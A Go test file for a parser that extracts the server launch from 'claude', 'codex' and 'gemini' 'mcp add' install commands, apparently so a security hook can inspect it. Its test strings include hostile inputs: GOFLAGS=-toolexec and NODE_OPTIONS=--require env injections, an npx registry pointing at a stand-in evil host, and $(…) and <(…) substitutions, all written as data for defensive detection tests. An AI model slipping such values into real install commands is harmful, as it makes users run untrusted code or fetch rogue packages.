package installread

import (
	"slices"
	"strings"
	"testing"
)

// MCP-ADD-NO-DASH-1: "<client> mcp add NAME COMMAND ARGS…" written without "--" — valid in claude's and gemini's own
// grammar when no server word starts with "-", in codex's whenever (a trailing positional) — names the server's
// launch as the "--" form does. Both readers, the hook, install_check and check_repo_config read it the same way.

func TestMCPAddNoDashTargets(t *testing.T) {
	for line, want := range map[string][]string{
		// claude: claude mcp add [options] <name> <commandOrUrl> [args...] (commander)
		"claude mcp add zz go run github.com/zz/mal@v1.0.0":                                                        {"go run github.com/zz/mal@v1.0.0"},
		"claude mcp add zz uvx zz-pypi-pkg":                                                                        {"uvx zz-pypi-pkg"},
		"claude mcp add --scope user zz npx zz-pkg":                                                                {"npx zz-pkg"},
		"claude mcp add -s user zz npx zz-pkg":                                                                     {"npx zz-pkg"},
		"claude mcp add -suser zz npx zz-pkg":                                                                      {"npx zz-pkg"},
		"claude mcp add zz -eGOFLAGS=-toolexec=./w go run example.com/zz@v1.0.0":                                   {"env GOFLAGS=-toolexec=./w go run example.com/zz@v1.0.0"},
		"claude mcp add -H 'X-Key: k' --transport http gh https://mcp.example.com/mcp":                             {"https://mcp.example.com/mcp"},
		"claude mcp add notion https://mcp.notion.com/mcp":                                                         {"https://mcp.notion.com/mcp"},
		"claude mcp add zz node server.js --scope user":                                                            {"node server.js"},
		"claude mcp add zz --scope=user python3 server.py":                                                         {"python3 server.py"},
		"claude mcp add --transport stdio zz docker run zz/img":                                                    {"docker run zz/img"},
		"claude mcp add zz -e GOFLAGS=-toolexec=./w go run example.com/zz@v1.0.0":                                  {"env GOFLAGS=-toolexec=./w go run example.com/zz@v1.0.0"},
		"claude mcp add --env A=1 --transport stdio zz go run example.com/zz@v1.0.0":                               {"go run example.com/zz@v1.0.0"},
		"claude mcp add zz npx -- -y zz-pkg":                                                                       {"npx -y zz-pkg"}, // "--" ends the options, not the positionals
		"claude mcp add zz -- npx -y zz-pkg":                                                                       {"npx -y zz-pkg"},
		"claude mcp add --transport http notion https://mcp.notion.com/mcp":                                        {"https://mcp.notion.com/mcp"},
		"claude mcp add -t sse asana https://mcp.asana.com/sse":                                                    {"https://mcp.asana.com/sse"},
		"claude mcp add --transport http gh https://api.githubcopilot.com/mcp/ --header 'Authorization: Bearer x'": {"https://api.githubcopilot.com/mcp/"},
		// codex: codex mcp add [OPTIONS] <NAME> (--url <URL> | -- <COMMAND>...) — the command is a trailing positional
		"codex mcp add zz npx -y zz-pkg":                                               {"npx -y zz-pkg"},
		"codex mcp add zz --env A=1 go run example.com/zz@v1.0.0":                      {"go run example.com/zz@v1.0.0"},
		"codex mcp add zz go run example.com/zz@v1.0.0 --env A=1":                      {"go run example.com/zz@v1.0.0 --env A=1"}, // the server's own words
		"codex mcp add zz --url https://mcp.example.com/mcp":                           {"https://mcp.example.com/mcp"},
		"codex mcp add zz --env GOFLAGS=-toolexec=./w -- go run example.com/zz@v1.0.0": {"env GOFLAGS=-toolexec=./w go run example.com/zz@v1.0.0"},
		// gemini: gemini mcp add [options] <name> <commandOrUrl> [args...] (yargs): words after "--" are more args
		"gemini mcp add -e GOFLAGS=-toolexec=./w zz go run example.com/zz@v1.0.0":        {"env GOFLAGS=-toolexec=./w go run example.com/zz@v1.0.0"},
		"gemini mcp add python-server python server.py -- --server-arg my-value":         {"python server.py --server-arg my-value"},
		"gemini mcp add --transport http http-server https://api.example.com/mcp/":       {"https://api.example.com/mcp/"},
		"gemini mcp add zz npx -y zz-pkg":                                                {"npx -y zz-pkg"}, // yargs: unknown options are the server's args
		"gemini mcp add -e A=1 zz npx -y --prefer-online zz-pkg":                         {"npx -y --prefer-online zz-pkg"},
		"gemini mcp add -e GOFLAGS=-toolexec=./w -e A=1 zz go run example.com/zz@v1.0.0": {"env GOFLAGS=-toolexec=./w go run example.com/zz@v1.0.0"},
		"gemini mcp add --type http zz https://api.example.com/mcp/":                     {"https://api.example.com/mcp/"},
		"gemini mcp add --trust zz uvx zz-pypi-pkg":                                      {"uvx zz-pypi-pkg"},
		"gemini mcp add --timeout 5000 --description 'a b' zz uvx zz-pypi-pkg":           {"uvx zz-pypi-pkg"},
	} {
		targets, unread, _, _ := ParseLine(line)
		if !slices.Equal(targets, want) || len(unread) > 0 {
			t.Errorf("ParseLine(%q) = %q, unread %q; want %q", line, targets, unread, want)
		}
	}
}

// Through npx (or a path) the CLI's own grammar is read too: its package and the server's launch.
func TestMCPAddNoDashThroughRunner(t *testing.T) {
	for line, want := range map[string][]string{
		"npx -y @anthropic-ai/claude-code mcp add zz go run github.com/zz/mal@v1.0.0":            {"npm:@anthropic-ai/claude-code", "go:github.com/zz/mal@v1.0.0"},
		"npx -y @anthropic-ai/claude-code mcp add zz uvx zz-pypi-pkg":                            {"npm:@anthropic-ai/claude-code", "pypi:zz-pypi-pkg"},
		"npx -y @openai/codex mcp add zz npx -y zz-pkg":                                          {"npm:@openai/codex", "npm:zz-pkg"},
		"npx -y @google/gemini-cli mcp add zz uvx zz-pypi-pkg":                                   {"npm:@google/gemini-cli", "pypi:zz-pypi-pkg"},
		"npx -y @google/gemini-cli mcp add zz npx -y zz-pkg":                                     {"npm:@google/gemini-cli", "npm:zz-pkg"},
		"npx -y @anthropic-ai/claude-code mcp add --transport http n https://mcp.notion.com/mcp": {"npm:@anthropic-ai/claude-code", "https://mcp.notion.com/mcp"},
	} {
		targets, unread, _, _ := ParseLine(line)
		slices.Sort(targets)
		slices.Sort(want)
		if !slices.Equal(targets, want) || len(unread) > 0 {
			t.Errorf("ParseLine(%q) = %q, unread %q; want %q", line, targets, unread, want)
		}
	}
}

// An option the CLI's grammar does not have, before the server's launch is known, is a form alalanet cannot read:
// commander and yargs would take it as the CLI's own (claude mcp add zz npx -y pkg). Nothing named: nothing to check.
func TestMCPAddNoDashUnread(t *testing.T) {
	for _, line := range []string{"claude mcp add zz npx -y zz-pkg", "claude mcp add -x zz npx zz-pkg", "codex mcp add -x zz npx zz-pkg"} {
		_, unread, _, _ := ParseLine(line)
		var codes []string
		for _, u := range unread {
			codes = append(codes, UnreadCode(u))
		}
		if !slices.Contains(codes, "unknown_install_form") {
			t.Errorf("ParseLine(%q): codes %q", line, codes)
		}
	}
	for _, line := range []string{"claude mcp add --help", "claude mcp add", "claude mcp add zz", "codex mcp add -h", "claude mcp list",
		"claude mcp add -t http zz mcp.example.com/mcp", "gemini mcp add -t sse zz mcp.example.com/sse", "claude mcp add --transport http zz http://localhost:8080/mcp", "claude mcp add zz http://localhost:8080/mcp",
		`claude mcp add --transport http zz "https://<your-app>/mcp"`, "codex mcp add zz --url 'https://<your-app>/mcp'"} {
		targets, unread, _, _ := ParseLine(line)
		if len(targets) > 0 || len(unread) > 0 {
			t.Errorf("ParseLine(%q) = %q, %q; want nothing", line, targets, unread)
		}
	}
}

// The second reader reads the same launch: the env it is given and the program it starts.
func TestMCPAddNoDashSecondReader(t *testing.T) {
	for line, want := range map[string]string{
		"claude mcp add zz -e NODE_OPTIONS=--require=./x.js node server.js":    "NODE_OPTIONS",
		"claude mcp add zz -e NODE_OPTIONS=--require=./x.js -- node server.js": "NODE_OPTIONS",
		"codex mcp add zz npx --registry=https://zz-evil.example zz-pkg":       "zz-evil.example",
		"codex mcp add zz -- npx --registry=https://zz-evil.example zz-pkg":    "zz-evil.example",
	} {
		targets, unread, _, subst := ParseLine(line)
		if extra := HookExtra(line, targets, unread, subst); !strings.Contains(strings.Join(extra, " "), want) {
			t.Errorf("HookExtra(%q) = %q; want %q", line, extra, want)
		}
	}
}

// Round 2: the spellings the review read in the clients' sources — commander continues a variadic option only as a
// separate word (P1-1), claude's hidden --xaa and --web take no value (P3-1), yargs's --no-<option>, a boolean's
// true/false and the camelCase names (P2-1), codex's global -c/--config, --enable and --disable (P2-2).
func TestMCPAddRound2Grammar(t *testing.T) {
	const mal = "go run github.com/zz/mal@v1.0.0"
	for line, want := range map[string]string{
		"claude mcp add -HX-K:v zz " + mal:                                   mal,
		"claude mcp add --header=X-K:v --header=X-L:w zz " + mal:             mal,
		"claude mcp add -H X-K:v X-L:w --scope user zz " + mal:               mal, // a separate -H still continues
		"claude mcp add --env=A=1 zz " + mal:                                 mal,
		"claude mcp add -eA=1 zz " + mal:                                     mal,
		"claude mcp add -e=A=1 zz " + mal:                                    mal,
		"claude mcp add --env=GOFLAGS=-toolexec=./w zz " + mal:               "env GOFLAGS=-toolexec=./w " + mal,
		"claude mcp add -e A=1 GOFLAGS=-toolexec=./w --scope user zz " + mal: "env GOFLAGS=-toolexec=./w " + mal,
		"claude mcp add --xaa zz " + mal:                                     mal,
		"claude mcp add --web zz " + mal:                                     mal,
		"gemini mcp add --trust=true zz " + mal:                              mal,
		"gemini mcp add --no-trust zz -- " + mal:                             mal,
		"gemini mcp add --includeTools=x --excludeTools=a,b zz " + mal:       mal,
		"gemini mcp add --no-include-tools zz " + mal:                        mal,
		"gemini mcp add zz npx --no-zz zz-pkg":                               "npx --no-zz zz-pkg", // not an option of its own: the server's argument
		"codex mcp add --config a=b zz " + mal:                               mal,
		"codex mcp add -ca=b zz " + mal:                                      mal,
		"codex mcp add --disable=x zz -- " + mal:                             mal,
		// the launch's words reread as the client gets them (round 2): quoted where the line would read them otherwise
		`claude mcp add zz -- uvx --python ">=3.11,<3.14" zz-pypi-pkg`:            "uvx --python '>=3.11,<3.14' zz-pypi-pkg",
		`claude mcp add zz node "$HOME/s.js"`:                                     "node $HOME/s.js",
		`claude mcp add zz -- node "$(cat f)"`:                                    "node $(cat f)",
		`claude mcp add zz -- npx -y zz-pkg "<(cat f)"`:                           "npx -y zz-pkg <(cat f)", // as the shell would read it unquoted
		`claude mcp add zz -- npx -y zz-pkg ">(cat)"`:                             "npx -y zz-pkg >(cat)",
		"gemini mcp add -e=GOFLAGS=-toolexec=./w zz go run example.com/zz@v1.0.0": "env GOFLAGS=-toolexec=./w go run example.com/zz@v1.0.0",
		"codex mcp add zz " + mal + " -c a=b":                                     mal + " -c a=b", // the server's own words
	} {
		targets, unread, _, _ := ParseLine(line)
		if !slices.Equal(targets, []string{want}) || len(unread) > 0 {
			t.Errorf("ParseLine(%q) = %q, unread %q; want %q", line, targets, unread, want)
		}
	}
	// an option the grammar does not have is still a hold, and the launch after "--" is judged as well (P2-2); without
	// "--" where the launch begins is not known, and nothing is judged
	for line, want := range map[string][]string{
		"claude mcp add --zz-unknown v zz -- " + mal: {mal},
		"claude mcp add zz --zz-unknown -- " + mal:   {mal},
		"codex mcp add --zz-unknown v zz -- " + mal:  {mal},
		"claude mcp add --zz-unknown -- zz " + mal:   {mal},
		"claude mcp add --zz-unknown zz " + mal:      nil,
		"codex mcp add --zz-unknown zz " + mal:       nil,
	} {
		targets, unread, _, _ := ParseLine(line)
		var codes []string
		for _, u := range unread {
			codes = append(codes, UnreadCode(u))
		}
		if !slices.Equal(targets, want) || !slices.Contains(codes, "unknown_install_form") {
			t.Errorf("ParseLine(%q) = %q %q; want %q and unknown_install_form", line, targets, codes, want)
		}
	}
}

// The client's grammar goes by the program's whole name or the client's own package, not a part of it (P3-3).
func TestMCPAddClientName(t *testing.T) {
	for prog, want := range map[string]string{
		"codex": "codex", "/usr/local/bin/codex": "codex", `C:\tools\codex.exe`: "codex", "codex.cmd": "codex", "codex@1.2.3": "codex",
		"@openai/codex": "codex", "@openai/codex@latest": "codex", "gemini": "gemini", "gemini-cli": "gemini",
		"@google/gemini-cli@0.1.0": "gemini", "GEMINI": "gemini",
		"gemini-tools": "claude", "codex-helper": "claude", "/opt/codex-tools/run": "claude", "@zz/codex": "claude",
		"@zz/gemini-cli": "claude", "@anthropic-ai/claude-code": "claude", "claude": "claude", "my-gemini": "claude",
	} {
		if got := mcpAddClient(prog); got != want {
			t.Errorf("mcpAddClient(%q) = %q; want %q", prog, got, want)
		}
	}
	// through npx: a package named like a client is read in claude's grammar (here: -y is no claude option)
	if targets, _, _, _ := ParseLine("npx -y gemini-tools mcp add zz npx -y zz-pkg"); slices.Contains(targets, "npm:zz-pkg") {
		t.Errorf("gemini-tools read as gemini: %q", targets)
	}
}
